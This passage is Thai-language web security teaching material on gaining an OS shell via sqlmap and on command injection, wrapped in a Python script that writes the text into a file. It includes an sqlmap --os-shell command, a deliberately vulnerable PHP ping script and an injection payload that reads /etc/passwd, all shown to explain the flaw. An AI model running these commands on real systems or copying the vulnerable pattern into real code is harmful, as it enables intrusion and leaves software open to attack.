#### 🟢 การเข้าครอบครองและควบคุมเครื่องแม่ข่าย (System Shell Access)
เมื่อผู้ใช้งานฐานข้อมูลเชื่อมต่อมีสิทธิ์ระดับสูง ดำเนินการยิงช่องโหว่เพื่อขอกล่องส่งคำสั่งระบบปฏิบัติการหลัก (OS Command Execution):
```bash
sqlmap -u "http://target.com/index.php?id=1" --os-shell
```

---

### 📄 SLIDE 151-160: Command Injections (ภัยคุกคามการแทรกฝังคำสั่งระบบปฏิบัติการ)
**ช่องโหว่ Command Injection** คือช่องโหว่ทางเว็บแอปพลิเคชันที่ร้ายแรงที่สุดช่องทางหนึ่ง เกิดจากโปรแกรมดึงอินพุตจากผู้ใช้งานไปรันร่วมกับคำสั่งของระบบปฏิบัติการ (System Commands) หลังบ้านโดยตรงโดยไม่คัดกรองความปลอดภัยอย่างเพียงพอ
- ส่งผลให้ผู้ประสงค์ร้ายสามารถป้อนเครื่องหมายคั่นคำสั่ง (เช่น `;`, `&`, `|`, `&&`) เพื่อสอดแทรกรันคำสั่งอื่นของระบบปฏิบัติการบนเซิร์ฟเวอร์ได้แบบไม่มีข้อจำกัด
- **ลิงก์ศึกษาเพิ่มเติมการทำงาน**: [What is Command Injection](https://www.indusface.com/learning/what-is-command-injection/)

#### 💻 ตัวอย่างซอร์สโค้ดที่เป็นอันตราย (Vulnerable Implementation)
ตัวอย่างระบบส่งคำสั่ง Ping ทดสอบเครื่องเครือข่ายหลังบ้านในภาษา PHP:
```php
<?php
  // ดึงค่าอินพุต IP จากพารามิเตอร์โดยตรง
  $ip = $_GET['ip'];
  
  // นำไปต่อสตริงในคำสั่งระบบปฏิบัติการตรงๆ โดยไม่มีการดักจับตัวอักษรพิเศษ
  $output = shell_exec("ping -c 4 " . $ip);
  echo "<pre>" . $output . "</pre>";
?>
```
- **การโจมตีผ่าน Command Injection**: หากแฮกเกอร์ป้อนอินพุตเป็น `8.8.8.8 ; cat /etc/passwd` คำสั่งที่รันจริงในระบบปฏิบัติการหลังบ้านจะกลายเป็น:
  ```bash
  ping -c 4 8.8.8.8 ; cat /etc/passwd
  ```
  ทำให้เครื่องแม่ข่ายของเซิร์ฟเวอร์ยอมรับการทำงานรันคำสั่งดึงไฟล์รายชื่อผู้ใช้ออกมาแสดงทันที
\"\"\"
"""

# Perform replacement
new_code = code[:start_idx] + new_val178_0 + code[end_pos:]

with open(file_path, "w", encoding="utf-8") as f:
    f.write(new_code)

print("Replacement successful!")
